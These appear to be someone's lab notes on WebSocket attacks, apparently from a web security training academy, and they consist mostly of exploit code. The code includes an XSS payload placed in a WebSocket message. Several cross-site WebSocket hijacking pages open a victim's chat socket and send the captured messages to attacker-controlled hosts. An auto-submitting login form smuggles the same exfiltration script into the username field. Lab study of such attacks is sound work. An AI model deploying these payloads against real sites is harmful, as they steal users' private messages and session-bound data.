### Common connection

```javascript
var ws = new WebSocket("wss://normal-website.com/chat");
```

The `Connection` and `Upgrade` headers in the request and response indicate that this is a WebSocket handshake.

### Manipulating websockets messages

In websocket message

`{"message":"<img src=1 onerror='alert(1)'>"}`

### Manipulating the WebSocket handshake

- Misplaced trust in HTTP headers to perform security decisions, such as the `X-Forwarded-For` header.
- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application.

## Cross-site WebSocket hijacking

```html
<html>
	<body>

		<script>

		    var ws = new WebSocket("wss://vulnerable-server.net/chat");

			function reqListener () {
			  const data = JSON.parse(this.responseText);
			  console.log(data);
			}

			function reqError (err) {
			  console.log('Fetch Error :-S', err);
			}
			const oReq = new XMLHttpRequest();
			oReq.onload = reqListener;
			oReq.onerror = reqError;
			
			
			ws.onopen = function (){
			ws.send("READY");
			};
			ws.addEventListener("message", (event) => {
			  console.log("Message from server ", event.data);
			oReq.open('get', 'https://exploit-server.net/'+event.data, true);
			oReq.send();
			});
		</script>

	</body>
</html>
```

```html
<script>
var ws = new WebSocket('wss://your-websocket-url');
	ws.onopen = function() {
		ws.send("READY");
	};
	ws.onmessage = function(event) {
		fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
	};
</script>
```

#### Con promesas

```javascript
let myArr = [];
let myPromise = new Promise(function(value,reject){
	var ws = new WebSocket('wss://0a4f009f04d6b2fb81cb3a6e00d500d8.web-security-academy.net/chat');
	ws.onopen = function(){
		ws.send('READY');
	};
	ws.addEventListener('message',(event)=>{
		myArr.push(event.data);
	});
	setTimeout(()=>{
		value(myArr.join());
	}, 5000);
	setTimeout(()=>{
		reject('error');
	}, 6000);
});
myPromise.then((val)=>{
	var ohttp = new XMLHttpRequest();
	ohttp.open('get', 'http://ATACKER-SERVER.net/' + val);
	ohttp.send();
});
```
## TEST

```html
<html>
	<body>
		<form action="https://cms-0a4f009f04d6b2fb81cb3a6e00d500d8.web-security-academy.net/login" method="POST">
			<input type="hidden" name="username" value="<script>let myArr = [];let myPromise = new Promise(function(value,reject){var ws = new WebSocket('wss://0a4f009f04d6b2fb81cb3a6e00d500d8.web-security-academy.net/chat');ws.onopen = function(){ws.send('READY');};ws.addEventListener('message',(event)=>{myArr.push(event.data);});setTimeout(()=>{value(myArr.join());},5000);setTimeout(()=>{reject('error');},6000);});myPromise.then((val)=>{var ohttp = new XMLHttpRequest();ohttp.open('get','https://exploit-0ada00c104dfb2ca814a39a001620070.exploit-server.net/'+val);ohttp.send();});</script>" />
			<input type="hidden" name="password" value="test" />
		</form>
		<script> document.forms[0].submit(); </script>
	</body>
</html>
```

```html
<script>
var myArr = [];
function myPromise() {
return new Promise ((res) =>{
var ws = new WebSocket("wss://0ac20063032c48a78238f13300140005.web-security-academy.net/chat");
ws.onopen = function (){
ws.send("READY");
};
ws.addEventListener("message", (event) => {
myArr.push(event.data);
});
});
} 
myPromise().then(
(function (value){
var oReq = new XMLHttpRequest();
oReq.open('get', 'https://exploit-0a8900ae0354487a82e0f09d015300ad.exploit-server.net/'+encodeURIComponent(myArr.join()), true);
oReq.send();
})());
</script>
```

```html
<script>
(function test(){
    var ws = new WebSocket("wss://0ac20063032c48a78238f13300140005.web-security-academy.net/chat");
ws.onopen = function (){
ws.send("READY");
};
    console.log('test');
ws.addEventListener("message", (event) => {
myArr.push(event.data);
})})();
setTimeout(() =>{
    var oReq = new XMLHttpRequest();
oReq.open('get', 'https://exploit-0a8900ae0354487a82e0f09d015300ad.exploit-server.net/'+encodeURIComponent(myArr.join()), true);
oReq.send();
},5000);
</script>
```